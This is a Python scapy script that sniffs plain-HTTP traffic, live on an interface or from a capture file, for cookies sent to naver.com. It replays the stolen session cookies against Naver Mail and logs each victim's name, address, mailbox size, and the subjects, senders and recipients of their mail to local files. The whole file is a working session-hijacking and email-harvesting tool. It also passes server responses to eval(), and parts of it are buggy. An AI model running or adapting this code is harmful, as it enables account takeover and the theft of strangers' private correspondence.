
from scapy.all import *
from threading import Thread
import sys
import re
import requests
import copy
import time
import datetime
import socket


naver_reg = re.compile(b"Host: (.*naver.com)\r\n")
redundance_remove = []
i = 0
def cookie_sniff(packet):
	global naver_reg
	global redundance_remove
	global i
	try:
		if packet.haslayer("TCP"):
			byte_pkt = packet.getlayer("TCP").__bytes__()
			if len(naver_reg.findall(byte_pkt)) != 0:
				cookie_start_idx = byte_pkt.find(b"Cookie: ")
				if cookie_start_idx != -1:
					cookie_end_idx = byte_pkt.find(b"\x0d\x0a", cookie_start_idx)
					cookie = byte_pkt[cookie_start_idx : cookie_end_idx]
					if cookie not in redundance_remove:
						redundance_remove.append(cookie)
						try:
							COOKIE_HASH_TABLE = cookie_parsing(cookie)
							mail_json_sniff(COOKIE_HASH_TABLE)
						except:
							pass
					else:
						return
	except:
		pass


def cookie_parsing(cookie):
	COOKIE_HASH_TABLE = {}
	cookie_list = cookie[8:].decode('utf-8').split()
	for a_cookie in cookie_list:
		spliter_idx = a_cookie.find("=")
		cookie_name = a_cookie[ :spliter_idx ]
		cookie_value = a_cookie[ spliter_idx+1 : -1]
		COOKIE_HASH_TABLE[cookie_name] = cookie_value

	return COOKIE_HASH_TABLE


null = 0 #dummy value for json
true = 1 #dummy value for json
false = 1 #dummy value for json


SIZE_LIST = []
time_duplicate = {}

def mail_json_sniff(COOKIE_HASH_TABLE):
	global time_duplicate
	global SIZE_LIST

	#sys.exit()
	#print(cookie_header)
	requer = requests.get("http://mail.naver.com", cookies = COOKIE_HASH_TABLE)
	
	response = requer.content
	json_mail = {}
	json_start_idx = response.find(b"mInfo = $Json")
	if json_start_idx != -1:
		json_end_idx = response.find(b".toObject()")
		json_mail = eval(response[json_start_idx + 14 : json_end_idx - 1 ])
	else:
		pass
	
	user_name = json_mail['env']['userName']

	try:
		time_duplicate[user_name]
	except:
		time_duplicate[user_name] = []

	if user_name not in SIZE_LIST:
		SIZE_LIST.append(user_name)
		with open("MAIL_SIZE.txt", "a+t") as f:
			f.write("{} {} {} \"{}\" {} {}\n".format(json_mail['env']['userName'], json_mail['env']['mailAddress'],
				json_mail['folder']['humanReadable'], json_mail['list']['folderName'], json_mail['list']['unreadCount'], json_mail['list']['totalCount'])
				)


	with open("MAIL_LIST.txt", "a+t") as f:
		mail_data_list = json_mail['list']['mailData']
		page_mail_count = len(mail_data_list)
		for mail in mail_data_list:

			if mail['toList'][0]['name'] == '':
				mail['toList'][0]['name'] = "None"

			sent_time = datetime.datetime.fromtimestamp(mail['sentTime']) + datetime.timedelta(0,0,0,0,0,16)
			if sent_time not in time_duplicate[user_name]:
				time_duplicate[user_name].append(sent_time)
				f.write("{} {} {} {} \"{}\" {} {} \"{}\"\n"\
					.format(json_mail['env']['userName'], json_mail['env']['mailAddress'],mail['toList'][0]['email'], mail['toList'][0]['name'],
					 mail['subject'], mail['from']['email'], mail['from']['name'], str(sent_time)) 
					)
			else:
				pass

	


if __name__ == '__main__':
	if (len(sys.argv) != 2):
		if sys.argv[1] not in ["live", "pcap"]:
			print("Input Condition 'live' or 'pcap'")
			print("USAGE : %s Condition - live or pcap" % sys.argv[0])
			sys.exit()

	with open("MAIL_LIST.txt", "wt") as f:
		f.write("This is userName userMail to_email to_name "
		"subject from_email from_name received_time\n")

	with open("MAIL_SIZE.txt", "wt") as f:
		f.write("This is userName userMail Size folderName unreadCount totalCount\n")


	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	s.connect(('8.8.8.8', 0))
	ip = s.getsockname()[0]
	print(ip)

	if(sys.argv[1]=="live"):
		sniff(iface= "tap0", prn=cookie_sniff, filter = "tcp port 80 and src host not " + ip)
	elif(sys.argv[1]=="pcap"):
		filename = raw_input("Input File Name : ")
		now_path = os.path.dirname(os.path.abspath(__file__))
		pcap_path = os.path.join(now_path, filename)
		pcap = rdpcap(pcap_path)
	for packet in pcap:
		cookie_sniff(packet)


	#sniff(iface = interface, prn = cookie_sniff ,filter = "tcp port 80 and src host not "+ip)





"""
json_mail['env']['userName']
json_mail['env']['mailAddress']
json_mail['folder']['humanReadable'] # humanreadable size(1.1GB)
json_mail['folder']['totalUnreadMail']
json_mail['list']['folderName']
json_mail['list']['unreadCount']
json_mail['list']['totalCount']
json_mail['list']['lastPage']
"""
"""
print(mail['subject']) # subject
print(mail['from']['email'])
print(mail['from']['name'])
print(mail['toList'][0]['email'])
print(mail['toList'][0]['name'])
print(mail['sentTime'])
"""
